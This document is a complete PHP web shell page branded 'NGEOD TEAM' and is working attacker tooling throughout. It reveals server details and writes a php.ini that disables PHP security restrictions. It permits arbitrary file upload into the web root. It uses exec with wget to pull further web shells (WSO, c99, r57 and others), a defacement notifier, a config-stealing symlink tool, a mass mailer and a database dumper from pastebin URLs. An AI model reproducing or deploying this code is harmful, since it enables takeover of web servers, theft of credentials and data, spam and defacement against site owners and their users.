<html>
<head>
<title>✘✘NGEOD✘✘</title>
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
input[type=submit] {
	background: transparent;
	color: #ffffff;
	height: 24px;
	border: 1px solid #ffffff;
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000;
	color: white;
	border: 1px solid #ffffff;
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
</style>
</head>
<center>
<img src="http://orig07.deviantart.net/a89f/f/2016/229/1/4/deku_the_hero__izuku_midoriya__season_2_render_by_ironoakman-dadd99s.png" width="200px" height="270px"><br>
<font color='red' size="6">✘✘</font><font color='white' size="8">NGEOD TEAM</font><font color='red' size="6">✘✘</font><br>
<body bgcolor="black">
<?php
#######################
#Thank's to IndoXploit#
#######################
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='green'>Sukses</font>";
}

echo "<font color='white'><form method='post' enctype='multipart/form-data'>
	  <input type='file' name='file'>
	  <input type='submit' name='upload' value='Upload!'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "sukses upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
	echo"<table align=center>";
    echo"<td>";
    echo"<form method='post'> ";
    echo"<select name='lucknut' style=padding:4px 10px;>";
    echo"<option selected'>         Summoner Tools       </option>";
    echo"<option value='zoneh'>         ZONE-H       </option>";
    echo"<option value='defid'>         DEFACER ID       </option>";
    echo"<option value='symconf'>         SYMLINK CONFIG       </option>";
    echo"<option value='mails'>         MAILER       </option>";
    echo"<option value='dump'>         DUMP DB       </option>";
    echo"<option value='wso_shell'>         WSO SHELL       </option>";
    echo"<option value='idx_shell'>         IDX SHELL       </option>";
    echo"<option value='c99_shell'>         C99 SHELL       </option>";
    echo"<option value='r57_shell'>         r57 SHELL      </option>";
    echo"<option value='galerz_shell'>         GALERZ SHELL       </option>";
    echo"<option value='t9_shell'>         T9 SHELL      </option>";
    echo"<option value='az_shell'>         AZZAT SHELL      </option>";
    echo"<option value='krdp'>         KRDP SHELL       </option>";
    echo "</select>";
    echo"&nbsp;<input type='submit' class='btn btn-success btn-sm' name='enter' value='Summon!'>";

 if(isset($_POST['enter']))   {
 if ($_POST['lucknut'] == 'wso_shell')  {
 $exec=exec('wget http://pastebin.com/raw.php?i=Tpm5E10g -O wsoshell.php');
 if(file_exists('./wsoshell.php')){
 echo '<center><a href=./wsoshell.php target="_blank"> wso.php </a> upload sukses !</center>';
} else {
echo '<center>gagal upload !</center>';
}
}elseif ($_POST['lucknut'] == 'az_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=0vy06H1x -O azshell.php');
        if(file_exists('./azshell.php')){
            echo '<center><a href=./azshell.php target="_blank"> azshell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 't9_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=zMdY8xDn -O t9shell.php');
        if(file_exists('./t9shell.php')){
            echo '<center><a href=./t9shell.php target="_blank"> t9shell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'galerz_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O galerzshell.php');
        if(file_exists('./galerzshell.php')){
            echo '<center><a href=./galerzshell.php target="_blank"> galerzshell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'r57_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O r57shell.php');
        if(file_exists('./r57shell.php')){
            echo '<center><a href=./r57shell.php target="_blank"> r57shell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'c99_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=Ms0ptnpH -O c99shell.php');
        if(file_exists('./c99shell.php')){
            echo '<center><a href=./c99shell.php target="_blank"> c99shell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'idx_shell') {
		$exec=exec('wget http://pastebin.com/raw.php?i=nC6pWh5a -O idxshell.php');
        if(file_exists('./idxshell.php')){
            echo '<center><a href=./idxshell.php target="_blank"> idxshell.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}else if ($_POST['lucknut'] == 'zoneh') {
		$exec=exec('wget http://pastebin.com/raw.php?i=B1Dk3P8R -O zoneh.php');
        if(file_exists('./zoneh.php')){
            echo '<center><a href=./zoneh.php target="_blank"> zoneh.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'krdp') {
		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
        if(file_exists('./krdp.php')){
            echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'defid') {
		$exec=exec('wget http://pastebin.com/raw.php?i=1b9bcZdH -O defid.php');
        if(file_exists('./defid.php')){
            echo '<center><a href=./defid.php target="_blank"> defid.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'krdp') {
		$exec=exec('wget http://pastebin.com/raw.php?i=weQnAGad -O krdp.php');
        if(file_exists('./krdp.php')){
            echo '<center><a href=./krdp.php target="_blank"> krdp.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'symconf') {
		$exec=exec('wget http://pastebin.com/raw.php?i=KyLM7awc -O symconf.php');
        if(file_exists('./symconf.php')){
            echo '<center><a href=./symconf.php target="_blank"> symconf.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'mails') {
		$exec=exec('wget http://pastebin.com/raw.php?i=6rTJ1ubw -O mail.php');
        if(file_exists('./mail.php')){
            echo '<center><a href=./mail.php target="_blank"> mail.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
}elseif ($_POST['lucknut'] == 'dump') {
		$exec=exec('wget http://pastebin.com/raw.php?i=ZG1A2s4u -O dump.php');
        if(file_exists('./dump.php')){
            echo '<center><a href=./dump.php target="_blank"> dump.php </a> upload sukses !</center>';
        } else {
            echo '<center>gagal upload !</center>';
        }
     }
}
?>
</center>
</html>
